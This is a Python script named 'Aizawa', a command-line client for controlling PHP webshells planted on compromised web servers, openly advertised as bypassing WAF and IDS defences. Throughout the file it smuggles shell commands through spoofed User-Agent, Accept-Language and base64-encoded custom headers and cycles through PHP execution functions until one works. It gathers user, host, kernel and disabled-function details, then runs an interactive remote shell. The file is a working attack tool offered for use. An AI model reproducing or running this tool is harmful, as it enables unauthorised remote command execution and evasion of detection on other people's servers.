#!/usr/bin/env python
######################################################
##                                                  ##
##                  A I Z A W A                     ##
##                                                  ##
## Simple command Line webshell by @elliottophellia ##
##                                                  ##
######################################################

# Imports


import re
import sys
import httpx
import base64
import asyncio
import validators


# Colors


RED = "\033[31m"
BOLD = "\033[1m"
CYAN = "\033[36m"
BLUE = "\033[34m"
CLEAR = "\033[0m"
GREEN = "\033[32m"
PURPLE = "\033[35m"
YELLOW = "\033[33m"


# Functions


async def http_request(client, method, url, headers=None, data=None):
    headers = headers or {}
    try:
        if method.lower() == "post":
            r = await client.post(url, headers=headers, data={"cmd": data})
        elif method.lower() == "get":
            r = await client.get(url, headers=headers)
        else:
            raise ValueError(
                f"{BOLD} {YELLOW} WARNING! {CLEAR}\n{RED}ERROR {CLEAR}: Invalid method {method}\n"
            )
        r.raise_for_status()
    except httpx.HTTPStatusError as e:
        print(
            f"{BOLD} {YELLOW} WARNING! {CLEAR}\n{RED}ERROR {CLEAR}: Error response {e.response.status_code} while making {method} request to {url}"
        )
        return None
    return r.text


def create_headers(user_agent=None, accept_language=None):
    headers = {
        "sec-ch-ua": 'Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": accept_language or "en-US,en;q=0.9",
    }
    return headers


async def http_user_agent_get(client, url, cmd):
    headers = create_headers(cmd, None)
    return await http_request(client, "get", url, headers)


async def http_accept_language_get(client, url, cmd):
    headers = create_headers(None, cmd)
    return await http_request(client, "get", url, headers)


async def http_user_agent_post(client, url, data, cmd):
    headers = create_headers(cmd, None)
    return await http_request(client, "post", url, headers, data)


async def http_accept_language_post(client, url, data, cmd):
    headers = create_headers(None, cmd)
    return await http_request(client, "post", url, headers, data)


async def http_aizawa_ninja(client, url, cmd):
    headers = create_headers()
    headers["Aizawa-Ninja"] = base64.b64encode(cmd.encode("utf-8"))
    return await http_request(client, "get", url, headers)


async def execute_http_request_get(client, url, cmd, method, request_func):
    result = await request_func(client, url + method, cmd)
    if result:
        return result
    return None


async def execute_http_request_post(client, url, cmd, method, request_func):
    result = await request_func(client, url, method, cmd)
    if result:
        return result
    return None


async def execute(client, url, cmd, type):
    if type == "ping":
        try:
            headers = create_headers()
            r = await client.get(url, headers=headers, follow_redirects=True)
            if r.status_code != 200:
                sys.exit(
                print(
                    BOLD
                    + YELLOW
                    + "WARNING!"
                    + CLEAR
                    + "\n"
                    + RED
                    + "ERROR"
                    + CLEAR
                    + ": Invalid HTTP response code\n"
                    + "Please check the URL and try again\n"
                ))
        except httpx.RequestError as e:
            sys.exit(
            print(
                BOLD
                + YELLOW
                + "WARNING!"
                + CLEAR
                + "\n"
                + RED
                + "ERROR"
                + CLEAR
                + ": URL is not reachable\n"
                + "Please check the URL and try again\n"
            ))

    if type in ["get", "post"]:
        headers = create_headers()
        if type == "get":
            r = await http_request(client, "get", url + cmd, headers)
            if r:
                return r
            return RED + "ERROR" + CLEAR
        elif type == "post":
            r = await client.post(url, headers=headers, data=cmd)
            if r.text:
                return r.text
            return RED + "ERROR" + CLEAR

    if type in [
        "http_aizawa_ninja_eval",
        "http_aizawa_ninja_concat",
        "http_aizawa_ninja_debug",
        "http_aizawa_ninja_gc",
        "http_aizawa_ninja_json",
        "http_aizawa_ninja_filter",
    ]:
        methods = ["system~", "passthru~", "shell_exec~", "exec~"]
        if type == "http_aizawa_ninja_eval":
            for method in methods:
                result = await http_aizawa_ninja(client, url, method + cmd)
                if result:
                    return result
            return RED + "ERROR" + CLEAR
        else:
            result = await http_aizawa_ninja(client, url, cmd)
            if result:
                return result
            return RED + "ERROR" + CLEAR

    if type in ["http_accept_language_get", "http_user_agent_get"]:
        methods = [
            "?cmd=system",
            "?cmd=proc_open",
            "?cmd=popen",
            "?cmd=passthru",
            "?cmd=shell_exec",
            "?cmd=exec",
        ]
        request_func = (
            http_accept_language_get
            if type == "http_accept_language_get"
            else http_user_agent_get
        )
        for method in methods:
            result = await execute_http_request_get(
                client, url, cmd, method, request_func
            )
            if result:
                return result
        return RED + "ERROR" + CLEAR

    if type in ["http_accept_language_post", "http_user_agent_post"]:
        methods = ["system", "proc_open", "popen", "passthru", "shell_exec", "exec"]
        request_func = (
            http_accept_language_post
            if type == "http_accept_language_post"
            else http_user_agent_post
        )
        for method in methods:
            result = await execute_http_request_post(
                client, url, cmd, method, request_func
            )
            if result:
                return result
        return RED + "ERROR" + CLEAR


def banner():
    banner_text = YELLOW + "\n   ___   ________  ___ _      _____ \n"
    banner_text += "  / _ | /  _/_  / / _ | | /| / / _ |\n"
    banner_text += " / __ |_/ /  / /_" + BLUE + "/ __ | |/ |/ / __ |\n"
    banner_text += "/_/ |_/___/ /___/_/ |_|__/|__/_/ |_|" + CLEAR + "\n"
    banner_text += "A Super Simple Command Line Webshell\nFor Bypassing Any Kind of WAF or IDS\n"
    banner_text += "Code by " + BOLD + "   @" + RED + "elliottophellia" + CLEAR + "    "
    banner_text += BOLD + "#" + RED + "V" + PURPLE + "S" + BLUE + "P" + YELLOW + "O" + CLEAR + "\n"
    print(banner_text)


async def main():
    # Httpx Client

    async with httpx.AsyncClient(verify=False, http2=True, timeout=None) as client:
        # Get URL and check if valid

        url = sys.argv[1] if len(sys.argv) > 1 else input("Webshell URL: ")
        if not validators.url(url):
            sys.exit(
            print(
                BOLD
                + YELLOW
                + "WARNING!"
                + CLEAR
                + "\n"
                + RED
                + "ERROR"
                + CLEAR
                + ": Invalid URL format\n"
                + "This does not appear to be a valid URL/IP address\n"
                + "Please check the input and try again\n"
            ))

        # Remove any characters after the file extension

        regex = re.compile(r"^.*\.[a-zA-Z]+", re.MULTILINE)
        remove_char = regex.findall(url)
        url = remove_char[0]

        # Check if URL is alive and reachable

        await execute(client, url, "", "ping")

        # Get filename and strip the domain

        filename = url[url.rfind("/") + 1 :]

        # Classify the webshell type based on the filename

        patterns_to_types = {
            r"get_aizawa_hal_(.*?)\.": "http_accept_language_get",
            r"get_aizawa_hua_(.*?)\.": "http_user_agent_get",
            r"post_aizawa_hal_(.*?)\.": "http_accept_language_post",
            r"post_aizawa_hua_(.*?)\.": "http_user_agent_post",
            r"aizawa_ninja_eval_(.*?)\.": "http_aizawa_ninja_eval",
            r"aizawa_ninja_concat_(.*?)\.": "http_aizawa_ninja_concat",
            r"aizawa_ninja_debug_(.*?)\.": "http_aizawa_ninja_debug",
            r"aizawa_ninja_gc_(.*?)\.": "http_aizawa_ninja_gc",
            r"aizawa_ninja_json_(.*?)\.": "http_aizawa_ninja_json",
            r"aizawa_ninja_filter_(.*?)\.": "http_aizawa_ninja_filter",
        }

        type = None

        for pattern, t in patterns_to_types.items():
            match = re.findall(pattern, filename)
            if match:
                type = t
                break

        if type is None:
            sys.exit(
            print(
                BOLD
                + YELLOW
                + "WARNING!"
                + CLEAR
                + "\n"
                + RED
                + "ERROR"
                + CLEAR
                + ": Invalid filename\n"
                + "This does not appear to be a valid Aizawa Webshell\n"
                + "Please check the URL and try again\n"
            ))

        # Get essential information

        # Get user and host

        user = await execute(client, url, "whoami", type)
        host = await execute(client, url, "hostname", type)
        pwd = await execute(client, url, "pwd", type)

        # Return default values if not found or error

        user = (
            "aizawaema"
            if not user or user == "\033[31mERROR\033[0m"
            else re.sub(r"\s+", "", user)
        )
        host = (
            "virtualesport"
            if not host or host == "\033[31mERROR\033[0m"
            else re.sub(r"\s+", "", host)
        )
        pwd = (
            "~/unknown/path"
            if not pwd or pwd == "\033[31mERROR\033[0m"
            else re.sub(r"\s+", "", pwd)
        )

        # Print essential information
        if type in [
            "http_aizawa_ninja_concat",
            "http_aizawa_ninja_debug",
            "http_aizawa_ninja_gc",
            "http_aizawa_ninja_json",
            "http_aizawa_ninja_filter",
            "http_aizawa_ninja_eval",
        ]:
            print(
                BOLD
                + GREEN
                + "Successfully connected to Aizawa Webshell Ninja Edition!"
                + CLEAR
            )
        else:
            print(
                BOLD
                + GREEN
                + "Successfully connected to Aizawa Webshell!"
                + CLEAR
                + "\n"
            )

            info_commands = {
                "Kernel": "unamea",
                "Server": "server",
                "Safe Mode": "safe_mode",
                "Server IP": "server_ip",
                "Client IP": "client_ip",
                "Disable Function": "disable_functions",
            }

            if type in ["http_accept_language_post", "http_user_agent_post"]:
                method = "post"
            elif type in ["http_accept_language_get", "http_user_agent_get"]:
                method = "get"

            # Calculate the maximum label width
            max_label_width = max(len(label) for label in info_commands.keys())

            for info, command in info_commands.items():
                if method == "get":
                    result = await execute(client, url, f"?{command}", method)
                elif method == "post":
                    result = await execute(client, url, f"{command}", method)
                formatted_info = f"{info.ljust(max_label_width)} : {result}"
                print(f"{BOLD}{formatted_info}{CLEAR}")

        # Initialize the shell

        while True:
            # Get command from user

            cmd = input(
                "\n"
                + BOLD
                + YELLOW
                + user
                + CLEAR
                + "@"
                + BOLD
                + BLUE
                + host
                + CLEAR
                + " "
                + PURPLE
                + pwd
                + CLEAR
                + " % "
            )
            if cmd == "exit" or cmd == "quit" or cmd == "\x03":
                sys.exit(print(BOLD + RED + "Exiting..." + CLEAR))
            if not cmd:
                continue

            # Execute command and print result

            print("\n" + CYAN + await execute(client, url, cmd, type) + CLEAR)


if __name__ == "__main__":
    # Print banner
    banner()

    # Run the script
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n" + BOLD + RED + "Ctrl + C detected. Exiting..." + CLEAR)
